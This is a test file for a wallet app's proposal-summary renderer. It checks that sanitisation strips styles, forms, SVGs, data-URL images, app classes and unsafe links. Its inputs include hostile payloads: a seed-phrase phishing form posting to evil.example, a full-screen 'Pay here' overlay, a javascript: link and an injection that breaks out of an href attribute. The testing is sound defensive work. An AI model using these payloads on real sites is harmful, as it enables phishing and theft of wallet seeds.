import ProposalSummary from "$lib/components/proposal-detail/ProposalSummary.svelte";
import { waitFor } from "@testing-library/dom";
import { render } from "@testing-library/svelte";

// The summary of a proposal comes from whoever submitted it. These tests check
// that the rendered summary cannot imitate the wallet UI.
describe("ProposalSummary", () => {
  // The Markdown component renders asynchronously. Every summary ends with
  // this marker, so a test knows when the rendering is complete.
  const marker = "end of the summary";

  const renderSummary = async (summary: string): Promise<HTMLElement> => {
    const { container } = render(ProposalSummary, {
      props: { summary: `${summary}\n\n${marker}` },
    });

    const element = container.querySelector<HTMLElement>(".markdown-container");
    expect(element).not.toBeNull();

    await waitFor(() => expect(element.textContent).toContain(marker));

    return element;
  };

  it("should render markdown", async () => {
    const element = await renderSummary(
      "# Title\n\nSome **bold** text and a [link](https://internetcomputer.org/)."
    );

    expect(element.querySelector("h1").textContent).toBe("Title");
    expect(element.querySelector("strong").textContent).toBe("bold");
    expect(element.querySelector("a").getAttribute("href")).toBe(
      "https://internetcomputer.org/"
    );
  });

  it("should render a table with its cell attributes", async () => {
    const element = await renderSummary("| a | b |\n| :-: | - |\n| 1 | 2 |");

    expect(element.querySelectorAll("table").length).toBe(1);
    expect(element.querySelector("th").getAttribute("align")).toBe("center");
  });

  it("should not render a style element", async () => {
    const element = await renderSummary(
      "<div><style>body { display: none; }</style></div>\n\nSummary text"
    );

    expect(element.querySelectorAll("style").length).toBe(0);
    expect(element.textContent).toContain("Summary text");
    expect(element.textContent).not.toContain("display: none");
  });

  it("should not render a style attribute", async () => {
    const element = await renderSummary(
      '<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff">Pay here</p>'
    );

    expect(element.querySelectorAll("[style]").length).toBe(0);
  });

  it("should not render a form", async () => {
    const element = await renderSummary(
      '<form action="https://evil.example/"><label>Seed phrase</label><input name="seed"><button>Claim</button></form>'
    );

    expect(element.querySelectorAll("form").length).toBe(0);
    expect(element.querySelectorAll("input").length).toBe(0);
    expect(element.querySelectorAll("button").length).toBe(0);
  });

  it("should not render an svg", async () => {
    const element = await renderSummary(
      '<svg width="100" height="100"><rect width="100" height="100" fill="red" /></svg>'
    );

    expect(element.querySelectorAll("svg").length).toBe(0);
    expect(element.querySelectorAll("rect").length).toBe(0);
  });

  it("should not render an image with a data url", async () => {
    const element = await renderSummary(
      '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="logo">'
    );

    expect(element.querySelectorAll("img").length).toBe(0);
    expect(element.querySelectorAll("[src]").length).toBe(0);
  });

  it("should not render a markdown image with a data url as a link", async () => {
    const element = await renderSummary(
      "![logo](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)"
    );

    expect(element.querySelectorAll("img").length).toBe(0);
    expect(element.querySelectorAll("a[href]").length).toBe(0);
  });

  it("should not render markup injected through a link destination", async () => {
    // The Markdown component writes the destination into the href attribute
    // without escaping the quote, so the destination can close the attribute.
    const element = await renderSummary(
      '[click](https://a.example"><form><input name="seed"></form>)'
    );

    expect(element.querySelectorAll("form").length).toBe(0);
    expect(element.querySelectorAll("input").length).toBe(0);
  });

  it("should not render the classes of the app", async () => {
    const element = await renderSummary(
      '<div class="content-cell-island" data-tid="proposal-summary-component"><p class="value" id="fake">Balance: 0 ICP</p></div>'
    );

    expect(element.querySelectorAll("[class]").length).toBe(0);
    expect(element.querySelectorAll("[id]").length).toBe(0);
    expect(element.querySelectorAll("[data-tid]").length).toBe(0);
    expect(element.textContent).toContain("Balance: 0 ICP");
  });

  it("should not render a link with an unsafe scheme", async () => {
    const element = await renderSummary("[click](javascript:alert(1))");

    expect(element.querySelectorAll("a[href]").length).toBe(0);
  });

  it("should give a new tab no access to the app", async () => {
    const element = await renderSummary("[click](https://evil.example/)");

    const link = element.querySelector("a");
    expect(link.getAttribute("target")).toBe("_blank");
    expect(link.getAttribute("rel")).toBe("noopener noreferrer");
  });
});
